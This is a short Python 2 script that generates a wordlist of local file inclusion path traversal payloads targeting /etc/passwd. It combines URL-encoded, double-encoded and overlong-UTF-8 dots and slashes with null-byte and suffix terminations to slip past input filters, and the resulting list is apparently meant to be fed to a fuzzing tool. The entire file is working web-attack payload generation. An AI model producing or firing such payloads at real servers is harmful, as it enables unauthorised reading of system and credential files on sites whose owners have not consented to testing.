#!/usr/bin/python

# A terrible hacky example of generating various LFI request possibilites on linux to bypass escape techniques. Resulting wordlist can be used in raider. 

d = 'a'
b = 'a'
dots = ['.', '%2e', '%u002e', '%252e', '%c0%2e', '%e0%40%ae', '%c0ae']
backslashes = ['/', '%2f', '%u2215', '%252f', '%c0%af', '%e0%80%af', '%c0%2f']
variations = list()
path = list()
terminations = ['', '%00', '?', '%0a.jpg']

for dot in dots:
	for terminate in terminations:
		for backslash in backslashes:
			variations.append(backslash+'etc'+backslash+'passwd'+terminate)
			variations.append(dot+dot+backslash+'etc'+backslash+'passwd'+terminate)
			variations.append(dot+dot+dot+dot+backslash+backslash+'etc'+backslash+'passwd'+terminate)
			variations.append(dot+dot+'"'+backslash+'etc'+backslash+'passwd'+terminate)

for example in variations:
	for num in range(0, 10):
		print num*example[:example.find("etc")]+example
